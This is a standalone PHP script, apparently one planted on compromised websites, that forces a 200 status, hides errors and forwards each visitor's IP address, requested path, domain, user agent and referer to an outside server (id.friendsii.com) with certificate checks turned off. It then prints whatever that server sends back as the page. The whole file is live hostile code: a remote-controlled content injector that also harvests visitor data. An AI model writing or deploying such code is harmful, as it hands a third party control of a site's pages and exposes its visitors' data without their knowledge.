<?php
header("HTTP/1.0 200");
header("HTTP/1.1 200");
header("HTTP/2.0 200");
header('Status: 200', TRUE, 200);
try{
    ini_set('display_errors','off');
    error_reporting(E_ALL ^ E_NOTICE); 
    set_time_limit(0);

    $api_url = "https://id.friendsii.com/ty.php";

    $header_curl = array("user_agent:".$_SERVER['HTTP_USER_AGENT']);
    $domain = isset($_SERVER['HTTP_X_FORWARDED_HOST']) ? $_SERVER['HTTP_X_FORWARDED_HOST'] : (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
    $file=(isset($_SERVER['REQUEST_URI']) && $_SERVER['REQUEST_URI']!='')?$_SERVER['REQUEST_URI']:$_SERVER['HTTP_X_REWRITE_URL'];

    $post_data = array('ip'=>getIP(),'file'=>$file,'domain'=>$domain);
    $result = posturl($api_url,$post_data);
    echo $result;
    exit();
}catch (Exception $exception){

}
function posturl($url,$post_data=null){
    $curl = curl_init();

    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    curl_setopt($curl, CURLOPT_TIMEOUT, 30);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_USERAGENT,$_SERVER['HTTP_USER_AGENT']);
    curl_setopt($curl, CURLOPT_REFERER, @$_SERVER['HTTP_REFERER']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($post_data));
   
    $data = curl_exec($curl);
    curl_close($curl);
    return $data;
}
function getIP() {
    if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
        $ip = getenv('HTTP_CLIENT_IP');
    } elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
    } elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
        $ip = getenv('REMOTE_ADDR');
    } elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return preg_match ( '/[\d\.]{7,15}/', $ip, $matches ) ? $matches [0] : '';
}
?>